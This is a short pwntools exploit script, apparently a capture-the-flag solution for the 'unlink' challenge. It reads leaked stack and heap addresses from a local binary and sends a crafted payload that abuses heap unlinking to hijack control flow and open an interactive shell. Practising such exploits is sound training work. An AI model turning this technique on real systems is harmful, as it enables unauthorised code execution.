from pwn import *

p = process('/home/unlink/unlink')

tmp = p.recvuntil(': ')
stack_leak = int(p.recvuntil('\n')[:-1], 16)
tmp = p.recvuntil(': ')
heap_leak = int(p.recvuntil('\n')[:-1], 16)

print "Stack Leak: {}, Heap Leak: {}".format(hex(stack_leak), hex(heap_leak))

payload = p32(0x80484eb) + "A"*12 + p32(stack_leak+0xc) + p32(heap_leak+0xc)
p.sendline(payload)
p.interactive()
